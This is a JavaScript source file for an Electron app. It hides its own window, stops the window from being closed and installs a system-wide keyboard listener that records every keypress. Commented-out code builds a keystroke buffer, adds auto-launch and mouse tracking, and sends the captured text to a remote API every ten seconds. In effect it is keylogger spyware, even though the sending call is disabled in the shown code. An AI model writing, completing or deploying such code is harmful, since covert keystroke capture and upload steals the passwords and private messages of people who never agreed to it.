const { app, BrowserWindow } = require('electron')
const {GlobalKeyboardListener} = require('node-global-key-listener')
const v = new GlobalKeyboardListener();
// const gkm = require('gkm');
// const sendPack = require('./sendPack');
// const prepareKey = require('./prepareKey');
// const autoLaunch = require('./autoLaunch');
// const ioHook = require('iohook');

var logger = '';

function createWindow () {
	const win = new BrowserWindow({width: 1024, height: 768})
	win.hide()

	win.on('close', e => {
		e.preventDefault() // Prevents quit
		win.hide()
	})

	v.addListener(function (e) {
    console.log(
        `${e.name}`
    );
});

	// ioHook.on('mousemove', (event) => {
	// 	console.log(event); // { type: 'mousemove', x: 700, y: 400 }
	// });

	// gkm.events.on('key.*', function (key) {
	// 	if (this.event === 'key.pressed') {
	// 		key[0] == 'Backspace'
	// 		? logger = logger.substring(0, logger.length - 1)
	// 		: logger += prepareKey(key[0]);
	// 	};
	// 	console.log(logger);
	// });

	setInterval(function () {
		console.log('Sending data to your API...', logger);
		// sendPack(logger);
	}, 10000);
  
}


app.on('ready', createWindow)

app.on('activate', () => { win.show() })
